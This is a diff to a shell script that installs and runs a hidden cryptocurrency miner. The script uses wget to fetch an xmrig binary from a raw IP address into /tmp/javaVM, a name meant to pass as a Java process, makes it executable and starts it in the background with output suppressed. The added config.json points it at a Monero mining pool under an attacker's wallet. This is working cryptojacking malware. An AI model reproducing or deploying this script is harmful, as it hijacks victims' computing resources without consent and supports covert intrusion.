@@ -1,10 +1,36 @@
 #!/bin/sh
+
+cat /dev/null > config.json
+cat >config.json <<EOL
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "algo": null,
+            "coin": "XMR",
+			"1gb-pages":true,
+			"rx":[0],
+            "url": "pool.supportxmr.com:3333",
+            "user": "NHbNLSXXkj2Xchnx4qTMXwRusLJMcTCchDaq.Work001",
+            "pass": "x",
+            "tls": true,
+            "keepalive": true,
+            "nicehash": true
+        }
+    ]
+}
+EOL
+
+
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 	/tmp/javaVM > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
+ 		wget -q http://150.136.168.71:80/archxx/xmrig1 -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 		/tmp/javaVM > /dev/null 2>&1 &
 fi
